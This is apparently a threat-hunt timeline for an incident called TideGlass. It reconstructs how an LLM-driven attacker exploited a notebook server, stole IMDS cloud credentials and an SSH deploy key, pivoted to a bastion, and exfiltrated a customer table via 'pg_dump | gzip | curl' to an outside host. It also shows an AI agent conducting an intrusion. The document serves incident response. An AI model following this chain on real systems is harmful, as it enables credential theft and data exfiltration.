# Attack Timeline

## Hunt 24: TideGlass — 2026-08-14 (UTC)

### Visual Timeline

```mermaid
gantt
    title TideGlass Attack Chain — 52 Minutes
    dateFormat HH:mm:ss
    axisFormat %H:%M

    section Initial Access
    WebSocket exploit (CVE-2026-39987)       :crit, ia1, 11:05:00, 1s
    python3.12 interpreter spawned           :crit, ia2, 11:05:06, 1s

    section Credential Theft
    IMDS credential theft (svc-notebook)     :crit, ct1, 11:08:12, 1s
    Secrets Manager enumeration (6 IPs)      :active, ct2, 11:08:00, 23m
    Inferred throttle gap (24s)              :ct3, 11:22:41, 24s
    GetSecretValue — deploy key stolen       :crit, ct4, 11:31:16, 1s
    Agent confirms deploy key retrieved      :ct5, 11:31:20, 2s
    chmod 600 id_ed25519 on notebook host    :ct6, 11:31:22, 1s

    section Lateral Movement
    SSH to bastion as deploy                 :crit, lm1, 11:34:27, 1s

    section Exfiltration
    psql table-size recon                    :ex1, 11:37:40, 2s
    Agent selects customers (2.8M rows)      :ex2, 11:37:42, 1s
    Postgres connection authorized           :ex3, 11:40:44, 1s
    pg_dump | gzip | curl — exfil complete   :crit, ex4, 11:40:49, 1s
```

### Detailed Event Log

| Time (UTC) | Δ from start | Event | Data Source | Finding |
|------------|-------------|-------|-------------|---------|
| 11:05:00 | +0:00 | GET /ws/kernel → HTTP 101 from 198.51.100.23 | ApacheAccess_CL | F1 |
| 11:05:02 | +0:02 | Agent identifies CVE-2026-39987 | LLMAgentLogs_CL | F1 |
| 11:05:06 | +0:06 | python3.12 PID 5211 spawned (parent: marimo) | LinuxProcess_CL | F2 |
| 11:08:12 | +3:12 | PID 5211 → IMDS (169.254.169.254) | LinuxNetwork_CL | F3 |
| 11:08:19 | +3:19 | "Role credentials retrieved for svc-notebook" | LLMAgentLogs_CL | F3 |
| 11:08–11:31 | +3:00–26:00 | Secrets Manager enumeration via 6-IP pool | AWSCloudTrail | F4 |
| 11:22:41 | +17:41 | Last call from .71 (gap begins) | AWSCloudTrail | F4 |
| 11:23:05 | +18:05 | Calls resume from .94 (inferred throttle) | AWSCloudTrail | F4 |
| 11:31:16 | +26:16 | GetSecretValue — bastion deploy key | AWSCloudTrail | F5 |
| 11:31:20 | +26:20 | Agent confirms passphrase-less deploy key | LLMAgentLogs_CL | F5 |
| 11:31:22 | +26:22 | chmod 600 /tmp/.c/id_ed25519 (user: marimo) | LinuxShellHistory_CL | F5 |
| 11:34:27 | +29:27 | SSH login: deploy from 10.6.0.10 → bastion | LinuxAuth_CL | F6 |
| 11:37:40 | +32:40 | psql table-size recon (\dt+ → sort → tail) | LinuxShellHistory_CL | F7 |
| 11:37:42 | +32:42 | Agent: customers = 2,841,902 rows | LLMAgentLogs_CL | F7 |
| 11:40:44 | +35:44 | Postgres: connection authorized (customers) | Syslog | F7 |
| 11:40:49 | +35:49 | pg_dump \| gzip \| curl → 203.0.113.41:8443 | LinuxShellHistory_CL | F7 |
| 11:40:49 | +35:49 | TCP confirm: bastion → 203.0.113.41:8443 | LinuxNetwork_CL | F7 |

### Attack Phases Summary

| Phase | Duration | Key Action | Impact |
|-------|----------|------------|--------|
| Initial Access | 6 seconds | CVE-2026-39987 exploit → interpreter | Code execution on notebook host |
| Credential Theft | ~23 minutes | IMDS → Secrets Manager enum → deploy key | SSH key for bastion access |
| Lateral Movement | ~3 minutes | SSH to bastion as deploy service account | Pivot to database network |
| Data Exfiltration | ~6 minutes | Table recon → pg_dump → compressed upload | 2.8M customer records lost |
| **Total** | **~36 minutes** | (11:05:00 → 11:40:49) | Full compromise chain |

---

*All times UTC on the attack clock (2026-08-14). The attack window extends to 11:57 for scoping, but the last observed malicious action is at 11:40:49.*
